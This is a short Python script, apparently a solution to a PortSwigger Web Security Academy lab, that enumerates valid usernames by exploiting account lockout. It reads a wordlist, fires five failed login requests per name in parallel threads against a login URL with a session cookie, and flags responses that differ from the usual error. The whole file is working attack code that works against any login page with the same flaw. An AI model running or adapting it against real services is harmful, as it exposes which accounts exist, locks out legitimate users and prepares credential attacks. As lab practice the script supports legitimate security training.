#!/usr/bin/env python3

#Written to solve this challenge
#https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    listLoginRequestText = list()

    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)

    for request in listLoginRequestText:
        if 'Invalid username or password.' not in request:
            print(request)
            print(f'[+] Found user: {username}')

def main():
    url = 'https://0a68004c03cf05658461a9c700640043.web-security-academy.net/login'
    cookie = {'session': 'vMgZxt8wAIiFH8U4WMFR8u2bCGyvvLxW'}

    userFileName = './auth_username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()